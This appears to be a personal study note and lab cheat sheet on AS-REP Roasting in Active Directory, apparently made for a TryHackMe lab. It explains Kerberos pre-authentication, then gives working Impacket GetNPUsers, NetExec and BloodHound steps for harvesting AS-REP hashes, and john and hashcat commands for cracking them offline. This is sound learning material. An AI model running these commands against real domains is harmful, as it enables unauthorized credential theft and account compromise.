#AD_AS-REP_Roasting


> AS-REP Roasting is an Active Directory attack where you request encrypted password hashes for accounts that don’t require Kerberos pre-authentication, and then crack the hashes offline.


# Explanation

### **Normal Kerberos Authentication Flow**

- **AS-REQ (Authentication Service Request):** The client requests a Ticket Granting Ticket (TGT) from the Key Distribution Center / Domain Controller (KDC/DC).
    
- **Pre-Authentication:** The client proves its identity by encrypting a **timestamp** using a secret key derived from the user's password.
    
- **AS-REP (Authentication Service Response):** The KDC verifies the timestamp and returns an AS-REP containing the TGT (which includes encrypted data derived from the user's long-term Kerberos key).
    
- **Next Flow:** The user proceeds to the Ticket Granting Service (TGS) exchange to request service tickets.
    

### **When `DONT_REQ_PREAUTH` is Enabled**

When an account has the **`DONT_REQ_PREAUTH`** flag enabled (a.k.a. _"Do not require Kerberos preauthentication"_), the user is **not required** to prove their identity during the initial request.

1. **AS-REQ:** An attacker sends an `AS-REQ` to the KDC for that specific username. No pre-authentication is provided.
    
2. **Pre-Authentication:** Skipped entirely (because the control is disabled).
    
3. **AS-REP:** The KDC immediately returns an `AS-REP` containing an encrypted TGT **without verifying the requester's identity**.
    

> While no plaintext password is sent directly, the returned `AS-REP` contains encrypted ticket data. An attacker can take this response offline and attempt to **crack the user's password using brute-force tools** (AS-REP Roasting).




___
# Step-by-Step Attack:-


# Scenario 1 — Unauthenticated (username list)

You don't have creds, but you enumerated valid usernames (RID cycling, OSINT, null session, etc.).
```bash
# Impacket — spray a userlist, request AS-REPs, save hashcat-format hashes
# GetNPUsers -> Users with `No Pre-Authentication` required
GetNPUsers.py 'THM.CORP/' -usersfile users.txt -no-pass -dc-ip 10.10.250.148 -format hashcat -outputfile as-rep.txt

# NetExec — needs anonymous LDAP bind to be allowed (rare on modern DCs),
# otherwise use Scenario 2 with creds
nxc ldap 10.10.250.148 -u users.txt -p '' --asreproast as-rep.txt
```

- `-u users.txt`: A list of usernames to test.
- `-p '' ` : Blank password (we're not logging in).
- `--asreproast` : Enables AS-REP roasting.
- `output.txt`: File where captured hashes will be saved

![[Pasted image 20260415152211.png]]
___


## Scenario 2 — Authenticated (query LDAP for the flag)

You have any valid domain credential. This lets you ask LDAP _which_ accounts are roastable instead of guessing, then request only those. Preferred when possible.

## Without BloodHound
```bash
# Impacket — -request auto-finds DONT_REQ_PREAUTH accounts and roasts them
GetNPUsers.py 'THM.CORP/user:Password123' -request -dc-ip 10.10.250.148 -format hashcat -outputfile as-rep.txt

# NetExec
nxc ldap 10.10.250.148 -u user -p 'Password123' --asreproast as-rep.txt
```

## With BloodHound

OR  when you uploaded the files to bloodhound GUI

Checking for AS-REP Roastable users,

<img width="1206" height="627" alt="image" src="https://github.com/user-attachments/assets/41aea20e-414a-4256-954b-9ea7d6ab7079" />

suppose in this case we have three users 

- ERNESTO_SILVA@THM.CORP
- TABATHA_BRITT@THM.CORP
- LEANN_LONG@THM.CORP


## Requesting hashes for specific users

Using impacket’s `GetNPUsers.py` to request a tgt for the users.

```bash
$ GetNPUsers.py -request -format john -no-pass thm.corp/ERNESTO_SILVA
$ GetNPUsers.py -request -format john -no-pass thm.corp/TABATHA_BRITT
$ GetNPUsers.py -request -format john -no-pass thm.corp/LEANN_LONG
```


# **Crack the Ticket**

```bash
john --wordlist=/home/kali/Documents/password.txt ./as-rep.txt 
hashcat -m 18200 ./as-rep.txt /home/kali/Documents/password.txt
```

![[Pasted image 20260415151946.png]]